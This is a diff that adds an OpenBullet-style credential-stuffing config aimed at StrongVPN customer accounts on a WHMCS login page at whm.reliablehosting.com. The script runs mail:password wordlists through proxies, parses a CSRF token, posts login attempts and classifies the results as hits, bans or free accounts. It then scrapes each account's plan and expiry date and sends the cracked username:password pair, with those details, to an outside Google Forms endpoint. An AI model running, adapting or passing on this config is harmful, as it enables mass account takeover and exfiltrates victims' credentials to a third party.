@@ -1,0 +1,87 @@
+﻿[SETTINGS]
+{
+  "Name": "StrongVPN",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-3T04:23:23.4936254+08:00",
+  "AdditionalInfo": "",
+  "Author": "ww",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://whm.reliablehosting.com/whmcs/clientarea.php" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#PARSE_csrfToken PARSE "<SOURCE>" LR "var csrfToken = '" "'," -> VAR "csrfToken" 
+
+REQUEST POST "https://whm.reliablehosting.com/whmcs/dologin.php" 
+  CONTENT "token=<csrfToken>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: zh-CN,zh;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: whm.reliablehosting.com" 
+  HEADER "Origin: https://whm.reliablehosting.com" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again" 
+  KEYCHAIN Ban OR 
+    KEY "500 Internal Server Error" 
+    KEY "502 Remote site or proxy node error :  ; TypeError: Failed to fetch" 
+  KEYCHAIN Success OR 
+    KEY "登出" 
+    KEY "Logout" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "您目前似乎沒有像我們申請任何產品 / 服務" 
+    KEY "It appears you do not have any products/services with us yet" 
+
+REQUEST GET "https://whm.reliablehosting.com/whmcs/clientarea.php?action=services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<td><strong>StrongVPN</strong></td>" "Active</span></td>" -> VAR "data" 
+
+#Expiration PARSE "<data>" LR "span class=\"hidden\">" "</span>" Recursive=TRUE -> CAP "Expiration" 
+
+#Plan PARSE "<data>" LR "<br />" "</td>" -> CAP "Plan" 
+
+REQUEST POST "https://docs.google.com/forms/d/e/1FAIpQLSfFeqALkUZUQfl6S_N_Tdp5HK5-XXeM7xTF0wo_jb1wjHX-vA/formResponse" 
+  CONTENT "entry.474341021=<USER>:<PASS> <Expiration> <Plan>&fvv=1&pageHistory=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://docs.google.com" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Expiration>" DoesNotContain "-" 
